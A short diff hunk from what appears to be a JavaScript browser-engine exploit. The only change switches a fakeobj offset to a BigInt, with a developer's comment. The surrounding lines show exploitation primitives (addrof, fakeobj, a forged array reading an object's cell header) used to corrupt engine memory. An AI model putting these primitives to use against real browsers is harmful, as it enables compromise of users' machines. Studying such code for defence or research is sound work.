@@ -123,7 +123,7 @@ var qwordAsFloat = qword => {
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            let fakeArr = fakeobj(addr + 0x10);
+            let fakeArr = fakeobj(addr + 0x10n); //no way around this im forced to use bigint for fakeobj :(
 
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0],true) - 0x1;
